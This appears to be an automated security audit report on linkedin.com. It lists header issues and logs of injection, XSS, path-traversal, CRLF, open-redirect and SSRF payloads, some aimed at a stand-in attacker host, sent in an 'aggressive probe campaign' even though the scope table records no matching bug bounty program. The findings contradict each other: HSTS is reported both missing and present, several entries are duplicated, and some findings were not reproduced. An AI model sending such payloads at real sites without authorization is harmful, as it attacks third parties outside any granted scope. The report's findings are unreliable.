# Security Audit Report - linkedin.com

## Scope and authorization

| Item | Value |
|---|---|
| Target | https://linkedin.com/ |
| Bug bounty program | [top-websites gist (no active program match)]() |
| Listed scope domain | linkedin.com |
| Test date | 2026-09-24 09:36 UTC |
| Method | Non-destructive passive/active probing (GET requests only, no forms submitted, no auth) |

## Summary

Total findings: **9** (High: 0, Medium: 1, Low: 1, Info: 7)

| # | Severity | ID | Finding | CWE |
|---|---|---|---|---|
| 1 | medium | X1 | CORS wildcard (observed in audit window, not reproduced on re-verify) | CWE-942 |
| 2 | low | H1 | Missing HSTS header | CWE-319 |
| 3 | info | H5 | Missing Referrer-Policy | CWE-200 |
| 4 | info | H5 | Missing Referrer-Policy | CWE-200 |
| 5 | info | H6 | Server technology disclosure | CWE-200 |
| 6 | info | H6 | Server technology disclosure | CWE-200 |
| 7 | info | P1 | Git config path answers via SPA fallback (no data exposed) | CWE-538 |
| 8 | info | P2 | Env file path answers via SPA fallback (no data exposed) | CWE-538 |
| 9 | info | R2 | Transient HTTP 200 (HTTPS redirect now consistent) | CWE-319 |

## Detailed findings

### 1. [MEDIUM] CORS wildcard (observed in audit window, not reproduced on re-verify) (`X1`)

- **CWE:** CWE-942
- **Detail:** Access-Control-Allow-Origin: * was observed on linkedin.com during the audit (200 HTML response with hostile Origin). Re-verification on the www root and /feed no longer reflected an ACAO, suggesting a transient edge-level reflection (no credentials accepted). Restrict ACAO to known origins or add Vary: Origin.
- **Recommendation:** Restrict Access-Control-Allow-Origin to known origins or add Vary: Origin.

### 2. [LOW] Missing HSTS header (`H1`)

- **CWE:** CWE-319
- **Detail:** No Strict-Transport-Security header present. Browsers do not enforce HTTPS for repeat visits.
- **Context:** http response
- **Recommendation:** Add Strict-Transport-Security with max-age >= 31536000 and preload.

### 3. [INFO] Missing Referrer-Policy (`H5`)

- **CWE:** CWE-200
- **Detail:** No Referrer-Policy header; full URL may leak to third-party referrers.
- **Context:** http response
- **Recommendation:** Set Referrer-Policy (e.g., strict-origin-when-cross-origin).

### 4. [INFO] Missing Referrer-Policy (`H5`)

- **CWE:** CWE-200
- **Detail:** No Referrer-Policy header; full URL may leak to third-party referrers.
- **Recommendation:** Set Referrer-Policy (e.g., strict-origin-when-cross-origin).

### 5. [INFO] Server technology disclosure (`H6`)

- **CWE:** CWE-200
- **Detail:** Server header reveals: ESF
- **Context:** http response
- **Recommendation:** Consider hiding or shortening the Server header.

### 6. [INFO] Server technology disclosure (`H6`)

- **CWE:** CWE-200
- **Detail:** Server header reveals: ESF
- **Recommendation:** Consider hiding or shortening the Server header.

### 7. [INFO] Git config path answers via SPA fallback (no data exposed) (`P1`)

- **CWE:** CWE-538
- **Detail:** GET https://linkedin.com/.git/config returned 200 during the audit (after a 301 to www.linkedin.com); re-verification shows www.linkedin.com serves an HTML 404 shell for this path and no git-config data was observed, consistent with SPA route fallback.
- **Recommendation:** Review and remediate per CWE guidance.

### 8. [INFO] Env file path answers via SPA fallback (no data exposed) (`P2`)

- **CWE:** CWE-538
- **Detail:** GET https://linkedin.com/.env returned 200 during the audit (after a 301 to www.linkedin.com); re-verification shows www.linkedin.com serves an HTML 404 shell for this path and no environment-file content was observed, consistent with SPA route fallback.
- **Recommendation:** Review and remediate per CWE guidance.

### 9. [INFO] Transient HTTP 200 (HTTPS redirect now consistent) (`R2`)

- **CWE:** CWE-319
- **Detail:** The initial probe of http://linkedin.com returned 200 without redirecting; three re-verifications all returned 301 to https://www.linkedin.com/ and the HTTPS response carries HSTS (max-age=31536000). Treated as transient HTTP serving.
- **Recommendation:** Add an HTTP->HTTPS redirect (currently returns an error code on port 80).

## Aggressive probe campaign

**Stage 1 - injection/reflection probes (28 requests):**

- no stage-1 probe hits (all probes negative)

**Stage 2 - aggressive probe suite v2 (99 requests):**

- no stage-2 probe hits (all probes negative)

Stage-2 probe log (observed responses):
- timing base=205ms id=203 search=203
- boolean b=301/0 t1=301/0 t2=301/0
- graphql /graphql -> 301
- graphql /api/graphql -> 301
- trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 301
- trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 301
- trav2 /%2e%2e%00.html -> 400
- trav2 /static//../../../../../../etc/passwd -> 301
- trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 301
- hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 301
- hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 301
- xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 301
- xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 301
- apicors /api -> 301
- apicors /api/v1 -> 301
- apicors /graphql -> 301
- apicors /rest -> 301
- apicors /v1 -> 301

## Evidence (raw response observations)

```json
{
  "http_status": 200,
  "https_status": 200,
  "content_type": "text/html; charset=utf-8",
  "title": "Checking your browser - reCAPTCHA",
  "path_gitconfig": 200,
  "path_envfile": 200,
  "path_securitytxt": 200,
  "security_txt_found": true,
  "path_robots": 200,
  "robots_found": true,
  "probe_count": 28,
  "probe_log": [
    "sqli /search?q=1%27+OR+1=1-- -> 200",
    "sqli /?id=1%27+OR+1=1-- -> 200",
    "sqli /?q=%27 -> 200",
    "sqli /products?filter=%27 -> 200",
    "sqli /?p=1;-- -> 200",
    "sqli-reflect /search?q=%27+OR+1=1-- -> 200",
    "xss /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 200",
    "xss /search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 200",
    "xss /search?query=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 200",
    "xss /?id=%3Csvg%20onload%3Dalert(1)%3E -> 200",
    "xss /search?term=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 200",
    "trav /..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd -> 200",
    "trav /static/../../../../../../../../etc/passwd -> 200",
    "trav /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -> 200",
    "trav /..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini -> 200",
    "redir /redirect?url=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "redir /redirect?next=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "redir /?next=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "redir /go?url=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "redir /url?url=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "redir /out?url=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "crlf /?q=a%0d%0aX-Inj:%201 -> 200",
    "crlf /search?q=a%0d%0aX-Inj:%201 -> 200",
    "host no reflection -> err",
    "ssrf /api/preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "ssrf /preview?url=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "ssrf /proxy?u=https%3A%2F%2Fevil-cors.example%2Fx -> 200",
    "ssrf /fetch?url=https%3A%2F%2Fevil-cors.example%2Fx -> 200"
  ],
  "v2_probe_count": 99,
  "v2_log": [
    "timing base=205ms id=203 search=203",
    "boolean b=301/0 t1=301/0 t2=301/0",
    "graphql /graphql -> 301",
    "graphql /api/graphql -> 301",
    "sweep no hits over 26 paths",
    "trav2 /%252e%252e/%252e%252e/%252e%252e/%252e% -> 301",
    "trav2 /..%255c..%255c..%255c..%255c..%255c..%2 -> 301",
    "trav2 /%2e%2e%00.html -> 400",
    "trav2 /static//../../../../../../etc/passwd -> 301",
    "trav2 /..%c0%af..%c0%af..%c0%af..%c0%af/etc/pa -> 301",
    "hpp /?q=1&q=%3Cscript%3Ealert(1)%3C%2Fscript%3E -> 301",
    "hpp /search?q=1&q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 301",
    "xss2 /?q=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E -> 301",
    "xss2 /?q=%27%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E -> 301",
    "redir2 no hits over 49 requests",
    "apicors /api -> 301",
    "apicors /api/v1 -> 301",
    "apicors /graphql -> 301",
    "apicors /rest -> 301",
    "apicors /v1 -> 301"
  ]
}
```

## Notes

- All tests used a standard browser User-Agent; each site was probed with a two-stage aggressive GET-only suite (passive/header checks plus stage-1 and stage-2 injection, XSS, traversal, CORS and redirect probes, up to ~100 requests per site).
- No credentials were used; no state was modified on the target.
- Findings are reported against the public program scope; submission through the program tracker is pending.
